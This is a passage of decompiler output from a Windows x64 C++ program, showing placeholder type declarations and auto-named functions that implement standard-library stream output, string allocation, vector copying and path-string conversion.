struct ctype<char> { // PlaceHolder Structure
};

typedef struct _Lockit _Lockit, *P_Lockit;

struct _Lockit { // PlaceHolder Structure
};

typedef struct _Locimp _Locimp, *P_Locimp;

struct _Locimp { // PlaceHolder Structure
};

typedef struct facet facet, *Pfacet;

struct facet { // PlaceHolder Structure
};

typedef struct id id, *Pid;

struct id { // PlaceHolder Structure
};

typedef enum error_type {
} error_type;

typedef int (* _onexit_t)(void);

typedef ulonglong size_t;

typedef int errno_t;




longlong * FUN_140001860(longlong *param_1,longlong *param_2,void **param_3)

{
  void *pvVar1;
  undefined *puVar2;
  
  FUN_140005310(param_1,param_2,(uint)param_3);
  pvVar1 = *param_3;
  *(undefined (*) [16])(param_1 + 5) = ZEXT816(0);
  param_1[7] = 0;
  param_1[8] = 0;
  puVar2 = (undefined *)0xffffffffffffffff;
  do {
    puVar2 = puVar2 + 1;
  } while (*(char *)((longlong)pvVar1 + (longlong)puVar2) != '\0');
  FUN_140001d68((void **)(undefined (*) [16])(param_1 + 5),pvVar1,puVar2);
  return param_1;
}



longlong * FUN_1400018b4(longlong *param_1,undefined8 *param_2)

{
  ulonglong uVar1;
  longlong *plVar2;
  bool bVar3;
  int iVar4;
  ulonglong uVar5;
  longlong lVar6;
  int iVar7;
  longlong *local_28;
  char local_20;
  
  uVar1 = param_2[2];
  if (0xf < (ulonglong)param_2[3]) {
    param_2 = (undefined8 *)*param_2;
  }
  iVar7 = 0;
  uVar5 = *(ulonglong *)((longlong)*(int *)(*param_1 + 4) + 0x28 + (longlong)param_1);
  if (((longlong)uVar5 < 1) || (uVar5 <= uVar1)) {
    lVar6 = 0;
  }
  else {
    lVar6 = uVar5 - uVar1;
  }
  FUN_140005b08(&local_28,param_1);
  if (local_20 == '\0') {
    iVar7 = 4;
  }
  else {
    if ((*(uint *)((longlong)*(int *)(*param_1 + 4) + 0x18 + (longlong)param_1) & 0x1c0) != 0x40) {
      for (; lVar6 != 0; lVar6 = lVar6 + -1) {
        iVar4 = std::basic_streambuf<char,struct_std::char_traits<char>_>::sputc
                          (*(basic_streambuf_char_struct_std__char_traits_char___ **)
                            ((longlong)*(int *)(*param_1 + 4) + 0x48 + (longlong)param_1),
                           *(char *)((longlong)*(int *)(*param_1 + 4) + 0x58 + (longlong)param_1));
        if (iVar4 == -1) {
          iVar7 = 4;
          goto LAB_140002fff;
        }
      }
    }
    uVar5 = std::basic_streambuf<char,struct_std::char_traits<char>_>::sputn
                      (*(basic_streambuf_char_struct_std__char_traits_char___ **)
                        ((longlong)*(int *)(*param_1 + 4) + 0x48 + (longlong)param_1),
                       (char *)param_2,uVar1);
    if (uVar5 == uVar1) {
LAB_140002fff:
      do {
        if (lVar6 == 0) goto LAB_140003026;
        iVar4 = std::basic_streambuf<char,struct_std::char_traits<char>_>::sputc
                          (*(basic_streambuf_char_struct_std__char_traits_char___ **)
                            ((longlong)*(int *)(*param_1 + 4) + 0x48 + (longlong)param_1),
                           *(char *)((longlong)*(int *)(*param_1 + 4) + 0x58 + (longlong)param_1));
        if (iVar4 == -1) break;
        lVar6 = lVar6 + -1;
      } while( true );
    }
    iVar7 = 4;
LAB_140003026:
    *(undefined8 *)((longlong)*(int *)(*param_1 + 4) + 0x28 + (longlong)param_1) = 0;
  }
  std::basic_ios<char,struct_std::char_traits<char>_>::setstate
            ((basic_ios_char_struct_std__char_traits_char___ *)
             ((longlong)*(int *)(*param_1 + 4) + (longlong)param_1),iVar7,false);
  bVar3 = std::uncaught_exception();
  if (!bVar3) {
    std::basic_ostream<char,struct_std::char_traits<char>_>::_Osfx
              ((basic_ostream_char_struct_std__char_traits_char___ *)local_28);
  }
  plVar2 = *(longlong **)((longlong)*(int *)(*local_28 + 4) + 0x48 + (longlong)local_28);
  if (plVar2 != (longlong *)0x0) {
    (**(code **)(*plVar2 + 0x10))();
  }
  return param_1;
}



longlong * FUN_1400018c8(longlong *param_1,char *param_2)

{
  longlong *plVar1;
  bool bVar2;
  int iVar3;
  __int64 _Var4;
  int iVar5;
  longlong lVar6;
  longlong lVar7;
  longlong *local_28;
  char local_20;
  
  iVar5 = 0;
  lVar7 = -1;
  do {
    lVar7 = lVar7 + 1;
  } while (param_2[lVar7] != '\0');
  lVar6 = *(longlong *)((longlong)*(int *)(*param_1 + 4) + 0x28 + (longlong)param_1);
  if ((lVar6 < 1) || (lVar6 <= lVar7)) {
    lVar6 = 0;
  }
  else {
    lVar6 = lVar6 - lVar7;
  }
  FUN_140005b08(&local_28,param_1);
  if (local_20 == '\0') {
    iVar5 = 4;
  }
  else {
    if ((*(uint *)((longlong)*(int *)(*param_1 + 4) + 0x18 + (longlong)param_1) & 0x1c0) != 0x40) {
      for (; 0 < lVar6; lVar6 = lVar6 + -1) {
        iVar3 = std::basic_streambuf<char,struct_std::char_traits<char>_>::sputc
                          (*(basic_streambuf_char_struct_std__char_traits_char___ **)
                            ((longlong)*(int *)(*param_1 + 4) + 0x48 + (longlong)param_1),
                           *(char *)((longlong)*(int *)(*param_1 + 4) + 0x58 + (longlong)param_1));
        if (iVar3 == -1) goto LAB_1400019b4;
      }
    }
    _Var4 = std::basic_streambuf<char,struct_std::char_traits<char>_>::sputn
                      (*(basic_streambuf_char_struct_std__char_traits_char___ **)
                        ((longlong)*(int *)(*param_1 + 4) + 0x48 + (longlong)param_1),param_2,lVar7)
    ;
    if (_Var4 == lVar7) {
      for (; 0 < lVar6; lVar6 = lVar6 + -1) {
        iVar3 = std::basic_streambuf<char,struct_std::char_traits<char>_>::sputc
                          (*(basic_streambuf_char_struct_std__char_traits_char___ **)
                            ((longlong)*(int *)(*param_1 + 4) + 0x48 + (longlong)param_1),
                           *(char *)((longlong)*(int *)(*param_1 + 4) + 0x58 + (longlong)param_1));
        if (iVar3 == -1) goto LAB_1400019b4;
      }
    }
    else {
LAB_1400019b4:
      iVar5 = 4;
    }
    *(undefined8 *)((longlong)*(int *)(*param_1 + 4) + 0x28 + (longlong)param_1) = 0;
  }
  std::basic_ios<char,struct_std::char_traits<char>_>::setstate
            ((basic_ios_char_struct_std__char_traits_char___ *)
             ((longlong)*(int *)(*param_1 + 4) + (longlong)param_1),iVar5,false);
  bVar2 = std::uncaught_exception();
  if (!bVar2) {
    std::basic_ostream<char,struct_std::char_traits<char>_>::_Osfx
              ((basic_ostream_char_struct_std__char_traits_char___ *)local_28);
  }
  plVar1 = *(longlong **)((longlong)*(int *)(*local_28 + 4) + 0x48 + (longlong)local_28);
  if (plVar1 != (longlong *)0x0) {
    (**(code **)(*plVar1 + 0x10))();
  }
  return param_1;
}



ulonglong FUN_140001a34(undefined8 *param_1,undefined8 *param_2)

{
  size_t *psVar1;
  int iVar2;
  undefined4 extraout_var;
  byte bVar4;
  size_t sVar3;
  
  sVar3 = param_2[2];
  if (0xf < (ulonglong)param_2[3]) {
    param_2 = (undefined8 *)*param_2;
  }
  psVar1 = param_1 + 2;
  if (0xf < (ulonglong)param_1[3]) {
    param_1 = (undefined8 *)*param_1;
  }
  if (*psVar1 == sVar3) {
    iVar2 = memcmp(param_1,param_2,*psVar1);
    sVar3 = CONCAT44(extraout_var,iVar2);
    bVar4 = 0;
    if (iVar2 == 0) goto LAB_140001a66;
  }
  bVar4 = 1;
LAB_140001a66:
  return sVar3 & 0xffffffffffffff00 | (ulonglong)bVar4;
}



// WARNING: Unknown calling convention yet parameter storage is locked
// Library Function - Single Match
//  void * __ptr64 __cdecl std::_Allocate_manually_vector_aligned<struct
// std::_Default_allocate_traits>(unsigned __int64)
// 
// Library: Visual Studio 2019 Release

void * std::_Allocate_manually_vector_aligned_struct_std___Default_allocate_traits_
                 (__uint64 param_1)

{
  code *pcVar1;
  void *pvVar2;
  void *pvVar3;
  
  if (param_1 + 0x27 <= param_1) {
    FUN_14000b454();
    pcVar1 = (code *)swi(3);
    pvVar2 = (void *)(*pcVar1)();
    return pvVar2;
  }
  pvVar2 = operator_new(param_1 + 0x27);
  if (pvVar2 != (void *)0x0) {
    pvVar3 = (void *)((longlong)pvVar2 + 0x27U & 0xffffffffffffffe0);
    *(void **)((longlong)pvVar3 + -8) = pvVar2;
    return pvVar3;
  }
                    // WARNING: Subroutine does not return
  _invalid_parameter_noinfo_noreturn();
}



void FUN_140001aac(void **param_1,void *param_2,ulonglong param_3)

{
  void *pvVar1;
  ulonglong uVar2;
  
  pvVar1 = *param_1;
  if ((ulonglong)((longlong)param_1[2] - (longlong)pvVar1 >> 2) < param_3) {
    FUN_140008fc0(param_1,param_3);
    pvVar1 = *param_1;
  }
  else {
    uVar2 = (longlong)param_1[1] - (longlong)pvVar1 >> 2;
    if (uVar2 < param_3) {
      FUN_1400027f4(param_2,uVar2,pvVar1);
      pvVar1 = param_1[1];
      param_2 = (void *)((longlong)param_2 + uVar2 * 4);
      param_3 = param_3 - uVar2;
    }
  }
  FUN_1400027f4(param_2,param_3,pvVar1);
  param_1[1] = (void *)((longlong)pvVar1 + param_3 * 4);
  return;
}



void FUN_140001b48(void **param_1,void *param_2,ulonglong param_3)

{
  void *pvVar1;
  ulonglong uVar2;
  
  pvVar1 = *param_1;
  if ((ulonglong)((longlong)param_1[2] - (longlong)pvVar1 >> 4) < param_3) {
    FUN_1400090bc(param_1,param_3);
    pvVar1 = *param_1;
  }
  else {
    uVar2 = (longlong)param_1[1] - (longlong)pvVar1 >> 4;
    if (uVar2 < param_3) {
      FUN_140002800(param_2,uVar2,pvVar1);
      pvVar1 = param_1[1];
      param_2 = (void *)(uVar2 * 0x10 + (longlong)param_2);
      param_3 = param_3 - uVar2;
    }
  }
  FUN_140002800(param_2,param_3,pvVar1);
  param_1[1] = (void *)(param_3 * 0x10 + (longlong)pvVar1);
  return;
}



char * FUN_140001d40(char *param_1,char *param_2,char *param_3,char *param_4,longlong **param_5,
                    uint param_6)

{
  char cVar1;
  char cVar2;
  char *pcVar3;
  bool bVar4;
  
  if ((param_6 & 0x100) != 0) {
    pcVar3 = param_1;
    if (param_1 != param_2) {
      do {
        bVar4 = param_3 == param_4;
        if (bVar4) goto LAB_140001d19;
        cVar2 = *param_3;
        param_3 = param_3 + 1;
        cVar1 = *pcVar3;
        pcVar3 = pcVar3 + 1;
        cVar2 = std::ctype<char>::tolower((ctype_char_ *)param_5[1],cVar2);
        cVar1 = std::ctype<char>::tolower((ctype_char_ *)param_5[1],cVar1);
        if (cVar1 != cVar2) {
          return param_1;
        }
      } while (pcVar3 != param_2);
    }
    bVar4 = param_3 == param_4;
LAB_140001d19:
    if (bVar4) {
      param_1 = pcVar3;
    }
    return param_1;
  }
  pcVar3 = param_1;
  if ((param_6 & 0x800) == 0) {
    while ((pcVar3 != param_2 && (param_3 != param_4))) {
      cVar2 = *param_3;
      param_3 = param_3 + 1;
      cVar1 = *pcVar3;
      pcVar3 = pcVar3 + 1;
      if (cVar1 != cVar2) {
        return param_1;
      }
    }
    if (param_3 != param_4) {
      return param_1;
    }
    return pcVar3;
  }
  if (param_1 != param_2) {
    do {
      bVar4 = param_3 == param_4;
      if (bVar4) goto LAB_140001c56;
      cVar2 = *param_3;
      param_3 = param_3 + 1;
      cVar1 = *pcVar3;
      pcVar3 = pcVar3 + 1;
      cVar1 = FUN_14000cf04(param_5,cVar1);
      cVar2 = FUN_14000cf04(param_5,cVar2);
      if (cVar1 != cVar2) {
        return param_1;
      }
    } while (pcVar3 != param_2);
  }
  bVar4 = param_3 == param_4;
LAB_140001c56:
  if (bVar4) {
    param_1 = pcVar3;
  }
  return param_1;
}



void FUN_140001d68(void **param_1,void *param_2,undefined *param_3)

{
  code *pcVar1;
  void *pvVar2;
  void *_Dst;
  ulonglong uVar3;
  
  if ((undefined *)0x7fffffffffffffff < param_3) {
    FUN_14000ba60();
    pcVar1 = (code *)swi(3);
    (*pcVar1)();
    return;
  }
  param_1[3] = (void *)0xf;
  if (param_3 < &DAT_00000010) {
    param_1[2] = param_3;
    memmove(param_1,param_2,(size_t)param_3);
    return;
  }
  pvVar2 = (void *)((ulonglong)param_3 | 0xf);
  if (pvVar2 < (void *)0x8000000000000000) {
    if (pvVar2 < (void *)0x16) {
      pvVar2 = (void *)0x16;
    }
    uVar3 = (longlong)pvVar2 + 1;
    if (uVar3 < 0x1000) {
      if (uVar3 == 0) {
        _Dst = (void *)0x0;
      }
      else {
        _Dst = operator_new(uVar3);
      }
      goto LAB_140001e03;
    }
  }
  else {
    uVar3 = 0x8000000000000000;
    pvVar2 = (void *)0x7fffffffffffffff;
  }
  _Dst = std::_Allocate_manually_vector_aligned_struct_std___Default_allocate_traits_(uVar3);
LAB_140001e03:
  *param_1 = _Dst;
  param_1[2] = param_3;
  param_1[3] = pvVar2;
  memcpy(_Dst,param_2,(size_t)param_3);
  *(undefined *)((longlong)_Dst + (longlong)param_3) = 0;
  return;
}



void FUN_140001e44(void **param_1,void *param_2,undefined *param_3)

{
  code *pcVar1;
  void *pvVar2;
  void *_Dst;
  ulonglong uVar3;
  
  if ((undefined *)0x7fffffffffffffff < param_3) {
    FUN_14000ba60();
    pcVar1 = (code *)swi(3);
    (*pcVar1)();
    return;
  }
  param_1[3] = (void *)0xf;
  if (param_3 < &DAT_00000010) {
    param_1[2] = param_3;
    memmove(param_1,param_2,0x10);
    return;
  }
  pvVar2 = (void *)((ulonglong)param_3 | 0xf);
  if (pvVar2 < (void *)0x8000000000000000) {
    if (pvVar2 < (void *)0x16) {
      pvVar2 = (void *)0x16;
    }
    uVar3 = (longlong)pvVar2 + 1;
    if (uVar3 < 0x1000) {
      _Dst = (void *)0x0;
      if (uVar3 != 0) {
        _Dst = operator_new(uVar3);
      }
      goto LAB_140001ed9;
    }
  }
  else {
    uVar3 = 0x8000000000000000;
    pvVar2 = (void *)0x7fffffffffffffff;
  }
  _Dst = std::_Allocate_manually_vector_aligned_struct_std___Default_allocate_traits_(uVar3);
LAB_140001ed9:
  *param_1 = _Dst;
  param_1[2] = param_3;
  param_1[3] = pvVar2;
  memcpy(_Dst,param_2,(size_t)(param_3 + 1));
  return;
}



void FUN_140001f10(void **param_1,void *param_2,void *param_3)

{
  code *pcVar1;
  void *pvVar2;
  void *_Dst;
  __uint64 _Var3;
  
  if ((void *)0x7ffffffffffffffe < param_3) {
    FUN_14000ba60();
    pcVar1 = (code *)swi(3);
    (*pcVar1)();
    return;
  }
  param_1[3] = (void *)0x7;
  if (param_3 < (void *)0x8) {
    param_1[2] = param_3;
    memmove(param_1,param_2,0x10);
    return;
  }
  pvVar2 = (void *)((ulonglong)param_3 | 7);
  if (pvVar2 < (void *)0x7fffffffffffffff) {
    if (pvVar2 < (void *)0xa) {
      pvVar2 = (void *)0xa;
    }
    if (0x7fffffffffffffff < (longlong)pvVar2 + 1U) {
      FUN_14000b454();
      pcVar1 = (code *)swi(3);
      (*pcVar1)();
      return;
    }
    _Var3 = ((longlong)pvVar2 + 1U) * 2;
    if (_Var3 < 0x1000) {
      _Dst = (void *)0x0;
      if (_Var3 != 0) {
        _Dst = operator_new(_Var3);
      }
      goto LAB_140001fbc;
    }
  }
  else {
    _Var3 = 0xfffffffffffffffe;
    pvVar2 = (void *)0x7ffffffffffffffe;
  }
  _Dst = std::_Allocate_manually_vector_aligned_struct_std___Default_allocate_traits_(_Var3);
LAB_140001fbc:
  *param_1 = _Dst;
  param_1[2] = param_3;
  param_1[3] = pvVar2;
  memcpy(_Dst,param_2,(longlong)param_3 * 2 + 2);
  return;
}



void FUN_140001ffc(undefined8 *param_1,ulonglong param_2,undefined4 *param_3)

{
  ulonglong uVar1;
  code *pcVar2;
  uint uVar3;
  undefined4 *puVar4;
  longlong *local_res8;
  
  if (param_2 != 0) {
    if (0x3fffffffffffffff < param_2) {
      FUN_14000ba74();
      pcVar2 = (code *)swi(3);
      (*pcVar2)();
      return;
    }
    uVar1 = param_2 * 4;
    if (uVar1 < 0x1000) {
      if (uVar1 == 0) {
        puVar4 = (undefined4 *)0x0;
      }
      else {
        puVar4 = (undefined4 *)operator_new(uVar1);
      }
    }
    else {
      puVar4 = (undefined4 *)
               std::_Allocate_manually_vector_aligned_struct_std___Default_allocate_traits_(uVar1);
    }
    *param_1 = puVar4;
    param_1[1] = puVar4;
    param_1[2] = puVar4 + param_2;
    uVar3 = FUN_1400030a4(param_3);
    if ((char)uVar3 == '\0') {
      do {
        *puVar4 = *param_3;
        puVar4 = puVar4 + 1;
        param_2 = param_2 - 1;
      } while (param_2 != 0);
    }
    else {
      FUN_140002a14(puVar4,param_2);
      puVar4 = puVar4 + param_2;
    }
    local_res8 = (longlong *)0x0;
    param_1[1] = puVar4;
    FUN_140005f98(&local_res8);
  }
  return;
}



void FUN_1400020cc(void **param_1,ulonglong param_2,void **param_3,longlong *param_4)

{
  ulonglong uVar1;
  void *pvVar2;
  longlong lVar3;
  code *pcVar4;
  void *pvVar5;
  longlong *local_res8;
  
  if (param_2 != 0) {
    if (0x3fffffffffffffff < param_2) {
      FUN_14000ba74();
      pcVar4 = (code *)swi(3);
      (*pcVar4)();
      return;
    }
    uVar1 = param_2 * 4;
    if (uVar1 < 0x1000) {
      if (uVar1 == 0) {
        pvVar5 = (void *)0x0;
      }
      else {
        pvVar5 = operator_new(uVar1);
      }
    }
    else {
      pvVar5 = std::_Allocate_manually_vector_aligned_struct_std___Default_allocate_traits_(uVar1);
    }
    *param_1 = pvVar5;
    param_1[1] = pvVar5;
    param_1[2] = (void *)(uVar1 + (longlong)pvVar5);
    pvVar2 = *param_3;
    lVar3 = *param_4;
    FUN_1400027c4(pvVar2,lVar3,pvVar5);
    local_res8 = (longlong *)0x0;
    param_1[1] = (void *)((longlong)pvVar5 + (lVar3 - (longlong)pvVar2 >> 2) * 4);
    FUN_140005f98(&local_res8);
  }
  return;
}



void FUN_140002190(void **param_1,ulonglong param_2,void **param_3,longlong *param_4)

{
  void *pvVar1;
  longlong lVar2;
  code *pcVar3;
  void *pvVar4;
  ulonglong uVar5;
  longlong *local_res8;
  
  if (param_2 != 0) {
    if (0xfffffffffffffff < param_2) {
      FUN_14000ba74();
      pcVar3 = (code *)swi(3);
      (*pcVar3)();
      return;
    }
    uVar5 = param_2 * 0x10;
    if (uVar5 < 0x1000) {
      if (uVar5 == 0) {
        pvVar4 = (void *)0x0;
      }
      else {
        pvVar4 = operator_new(uVar5);
      }
    }
    else {
      pvVar4 = std::_Allocate_manually_vector_aligned_struct_std___Default_allocate_traits_(uVar5);
    }
    *param_1 = pvVar4;
    param_1[1] = pvVar4;
    param_1[2] = (void *)(uVar5 + (longlong)pvVar4);
    pvVar1 = *param_3;
    lVar2 = *param_4;
    FUN_1400027c4(pvVar1,lVar2,pvVar4);
    local_res8 = (longlong *)0x0;
    param_1[1] = (void *)((lVar2 - (longlong)pvVar1 & 0xfffffffffffffff0U) + (longlong)pvVar4);
    FUN_140006014(&local_res8);
  }
  return;
}



void FUN_140002254(void **param_1,ulonglong param_2,void **param_3,longlong *param_4)

{
  void *pvVar1;
  longlong lVar2;
  code *pcVar3;
  void *pvVar4;
  
  if (param_2 != 0) {
    if (0x7fffffffffffffff < param_2) {
      FUN_14000ba74();
      pcVar3 = (code *)swi(3);
      (*pcVar3)();
      return;
    }
    if (param_2 < 0x1000) {
      pvVar4 = operator_new(param_2);
    }
    else {
      pvVar4 = std::_Allocate_manually_vector_aligned_struct_std___Default_allocate_traits_(param_2)
      ;
    }
    *param_1 = pvVar4;
    param_1[1] = pvVar4;
    param_1[2] = (void *)((longlong)pvVar4 + param_2);
    pvVar1 = *param_3;
    lVar2 = *param_4;
    FUN_1400027c4(pvVar1,lVar2,pvVar4);
    param_1[1] = (void *)((lVar2 - (longlong)pvVar1) + (longlong)pvVar4);
  }
  return;
}



void FUN_1400022fc(longlong **param_1,ulonglong param_2,undefined8 *param_3,undefined8 *param_4)

{
  code *pcVar1;
  longlong *plVar2;
  ulonglong uVar3;
  
  if (param_2 != 0) {
    plVar2 = (longlong *)0x0;
    if (0x38e38e38e38e38e < param_2) {
      FUN_14000ba74();
      pcVar1 = (code *)swi(3);
      (*pcVar1)();
      return;
    }
    uVar3 = param_2 * 0x48;
    if (uVar3 < 0x1000) {
      if (uVar3 != 0) {
        plVar2 = (longlong *)operator_new(uVar3);
      }
    }
    else {
      plVar2 = (longlong *)
               std::_Allocate_manually_vector_aligned_struct_std___Default_allocate_traits_(uVar3);
    }
    *param_1 = plVar2;
    param_1[1] = plVar2;
    param_1[2] = plVar2 + param_2 * 9;
    plVar2 = FUN_1400049c8((undefined8 *)*param_3,(undefined8 *)*param_4,plVar2);
    param_1[1] = plVar2;
  }
  return;
}



undefined (*) [16] FUN_1400023a4(undefined (*param_1) [16],longlong param_2)

{
  longlong *plVar1;
  undefined4 local_28;
  undefined4 uStack36;
  undefined4 uStack32;
  undefined4 uStack28;
  longlong local_18 [2];
  
  plVar1 = FUN_140004958(local_18,param_2);
  local_28 = *(undefined4 *)plVar1;
  uStack36 = *(undefined4 *)((longlong)plVar1 + 4);
  uStack32 = *(undefined4 *)(plVar1 + 1);
  uStack28 = *(undefined4 *)((longlong)plVar1 + 0xc);
  FUN_140002470(param_1,&local_28);
  return param_1;
}



undefined (*) [16] FUN_1400023e8(undefined (*param_1) [16],longlong *param_2)

{
  longlong *plVar1;
  undefined4 local_28;
  undefined4 uStack36;
  undefined4 uStack32;
  undefined4 uStack28;
  longlong local_18 [2];
  
  plVar1 = FUN_14000498c(local_18,param_2);
  local_28 = *(undefined4 *)plVar1;
  uStack36 = *(undefined4 *)((longlong)plVar1 + 4);
  uStack32 = *(undefined4 *)(plVar1 + 1);
  uStack28 = *(undefined4 *)((longlong)plVar1 + 0xc);
  FUN_140002470(param_1,&local_28);
  return param_1;
}



undefined (*) [16] FUN_14000242c(undefined (*param_1) [16],undefined8 *param_2)

{
  undefined8 *puVar1;
  undefined4 local_28;
  undefined4 uStack36;
  undefined4 uStack32;
  undefined4 uStack28;
  undefined8 local_18 [2];
  
  puVar1 = FUN_140004970(local_18,param_2);
  local_28 = *(undefined4 *)puVar1;
  uStack36 = *(undefined4 *)((longlong)puVar1 + 4);
  uStack32 = *(undefined4 *)(puVar1 + 1);
  uStack28 = *(undefined4 *)((longlong)puVar1 + 0xc);
  FUN_140002470(param_1,&local_28);
  return param_1;
}



undefined (*) [16] FUN_140002470(undefined (*param_1) [16],undefined4 *param_2)

{
  ulonglong uVar1;
  undefined4 local_18;
  undefined4 uStack20;
  undefined4 uStack16;
  undefined4 uStack12;
  
  uVar1 = FUN_14000e3d0();
  local_18 = *param_2;
  uStack20 = param_2[1];
  uStack16 = param_2[2];
  uStack12 = param_2[3];
  FUN_140009244(param_1,(UINT)uVar1,(LPCSTR *)&local_18);
  return param_1;
}



undefined (*) [16] FUN_1400024ac(undefined (*param_1) [16],undefined4 *param_2)

{
  ulonglong uVar1;
  undefined4 local_18;
  undefined4 uStack20;
  undefined4 uStack16;
  undefined4 uStack12;
  
  uVar1 = FUN_14000e3d0();
  local_18 = *param_2;
  uStack20 = param_2[1];
  uStack16 = param_2[2];
  uStack12 = param_2[3];
  FUN_1400024f8(param_1,(UINT)uVar1,(LPCWSTR *)&local_18);
  return param_1;
}



undefined (*) [16] FUN_1400024f8(undefined (*param_1) [16],UINT param_2,LPCWSTR *param_3)

{
  LPCWSTR pWVar1;
  code *pcVar2;
  int iVar3;
  int iVar4;
  undefined8 uVar5;
  undefined (*pauVar6) [16];
  ulonglong uVar7;
  
  *param_1 = ZEXT816(0);
  *(undefined8 *)param_1[1] = 0;
  *(undefined8 *)param_1[1] = 0;
  *(undefined8 *)(param_1[1] + 8) = 0xf;
  (*param_1)[0] = 0;
  if (param_3[1] != (LPCWSTR)0x0) {
    if ((LPCWSTR)0x7fffffff < param_3[1]) {
      FUN_14000b4e8(0x16);
      pcVar2 = (code *)swi(3);
      pauVar6 = (undefined (*) [16])(*pcVar2)();
      return pauVar6;
    }
    iVar4 = *(int *)(param_3 + 1);
    pWVar1 = *param_3;
    uVar5 = __std_fs_convert_wide_to_narrow(param_2,pWVar1,iVar4,(LPSTR)0x0,0);
    iVar3 = (int)((ulonglong)uVar5 >> 0x20);
    if (iVar3 != 0) {
      FUN_14000b524(iVar3);
      pcVar2 = (code *)swi(3);
      pauVar6 = (undefined (*) [16])(*pcVar2)();
      return pauVar6;
    }
    uVar7 = (ulonglong)(int)uVar5;
    if (uVar7 < *(ulonglong *)param_1[1] || uVar7 == *(ulonglong *)param_1[1]) {
      pauVar6 = param_1;
      if (0xf < *(ulonglong *)(param_1[1] + 8)) {
        pauVar6 = *(undefined (**) [16])*param_1;
      }
      *(ulonglong *)param_1[1] = uVar7;
      (*pauVar6)[uVar7] = 0;
    }
    else {
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::append
                ((basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *)
                 param_1,uVar7 - *(longlong *)param_1[1],'\0');
    }
    pauVar6 = param_1;
    if (0xf < *(ulonglong *)(param_1[1] + 8)) {
      pauVar6 = *(undefined (**) [16])*param_1;
    }
    uVar5 = __std_fs_convert_wide_to_narrow(param_2,pWVar1,iVar4,(LPSTR)pauVar6,(int)uVar5);
    iVar4 = (int)((ulonglong)uVar5 >> 0x20);
    if (iVar4 != 0) {
      FUN_14000b524(iVar4);
      pcVar2 = (code *)swi(3);
      pauVar6 = (undefined (*) [16])(*pcVar2)();
      return pauVar6;
    }
  }
  return param_1;
}



undefined (*) [16] FUN_140002604(undefined (*param_1) [16],UINT param_2,LPCWSTR *param_3)

{
  LPCWSTR pWVar1;
  code *pcVar2;
  int iVar3;
  int iVar4;
  undefined8 uVar5;
  undefined (*pauVar6) [16];
  ulonglong uVar7;
  
  *param_1 = ZEXT816(0);
  *(undefined8 *)param_1[1] = 0;
  *(undefined8 *)param_1[1] = 0;
  *(undefined8 *)(param_1[1] + 8) = 0xf;
  (*param_1)[0] = 0;
  if (param_3[1] != (LPCWSTR)0x0) {
    if ((LPCWSTR)0x7fffffff < param_3[1]) {
      FUN_14000b4e8(0x16);
      pcVar2 = (code *)swi(3);
      pauVar6 = (undefined (*) [16])(*pcVar2)();
      return pauVar6;
    }
    iVar4 = *(int *)(param_3 + 1);
    pWVar1 = *param_3;
    uVar5 = FUN_14000e564(param_2,pWVar1,iVar4,(LPSTR)0x0,0);
    iVar3 = (int)((ulonglong)uVar5 >> 0x20);
    if (iVar3 != 0) {
      FUN_14000b524(iVar3);
      pcVar2 = (code *)swi(3);
      pauVar6 = (undefined (*) [16])(*pcVar2)();
      return pauVar6;
    }
    uVar7 = (ulonglong)(int)uVar5;
    if (uVar7 < *(ulonglong *)param_1[1] || uVar7 == *(ulonglong *)param_1[1]) {
      pauVar6 = param_1;
      if (0xf < *(ulonglong *)(param_1[1] + 8)) {
        pauVar6 = *(undefined (**) [16])*param_1;
      }
      *(ulonglong *)param_1[1] = uVar7;
      (*pauVar6)[uVar7] = 0;
    }
    else {
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::append
                ((basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *)
                 param_1,uVar7 - *(longlong *)param_1[1],'\0');
    }
    pauVar6 = param_1;
    if (0xf < *(ulonglong *)(param_1[1] + 8)) {
      pauVar6 = *(undefined (**) [16])*param_1;
    }
    uVar5 = FUN_14000e564(param_2,pWVar1,iVar4,(LPSTR)pauVar6,(int)uVar5);
    iVar4 = (int)((ulonglong)uVar5 >> 0x20);
    if (iVar4 != 0) {
      FUN_14000b524(iVar4);
      pcVar2 = (code *)swi(3);
      pauVar6 = (undefined (*) [16])(*pcVar2)();
      return pauVar6;
    }
  }
  return param_1;
}



undefined4 * FUN_140002710(undefined4 *param_1,uint **param_2,uint **param_3,uint **param_4)

{
  uint *puVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  uint *puVar5;
  uint uVar6;
  uint *puVar7;
  uint *puVar8;
  
  puVar1 = *param_2;
  while ((puVar7 = *param_3, puVar1 != puVar7 || (param_2[1] != param_3[1]))) {
    if (param_3[1] == (uint *)0x0) {
      puVar7 = puVar7 + -1;
      puVar5 = (uint *)0x1f;
      *param_3 = puVar7;
    }
    else {
      puVar5 = (uint *)((longlong)param_3[1] + -1);
    }
    param_3[1] = puVar5;
    if (param_4[1] == (uint *)0x0) {
      *param_4 = *param_4 + -1;
      puVar8 = (uint *)0x1f;
    }
    else {
      puVar8 = (uint *)((longlong)param_4[1] + -1);
    }
    param_4[1] = puVar8;
    uVar6 = **param_4;
    if ((*puVar7 & 1 << ((byte)puVar5 & 0x1f)) == 0) {
      uVar6 = uVar6 & ~(1 << ((uint)puVar8 & 0x1f));
    }
    else {
      uVar6 = uVar6 | 1 << ((uint)puVar8 & 0x1f);
    }
    **param_4 = uVar6;
  }
  uVar2 = *(undefined4 *)((longlong)param_4 + 4);
  uVar3 = *(undefined4 *)(param_4 + 1);
  uVar4 = *(undefined4 *)((longlong)param_4 + 0xc);
  *param_1 = *(undefined4 *)param_4;
  param_1[1] = uVar2;
  param_1[2] = uVar3;
  param_1[3] = uVar4;
  return param_1;
}



longlong FUN_1400027c4(void *param_1,longlong param_2,void *param_3)

{
  memmove(param_3,param_1,param_2 - (longlong)param_1);
  return (param_2 - (longlong)param_1) + (longlong)param_3;
}



void FUN_1400027f4(void *param_1,longlong param_2,void *param_3)

{
  FUN_1400027c4(param_1,(longlong)((longlong)param_1 + param_2 * 4),param_3);
  return;
}



void FUN_140002800(void *param_1,longlong param_2,void *param_3)

{
  FUN_1400027c4(param_1,(longlong)(param_2 * 0x10 + (longlong)param_1),param_3);
  return;
}



undefined8 * FUN_14000280c(undefined8 *param_1,undefined *param_2,undefined *param_3,void **param_4)

{
  undefined uVar1;
  void *pvVar2;
  void **ppvVar3;
  
  if (param_2 != param_3) {
    do {
      pvVar2 = param_4[2];
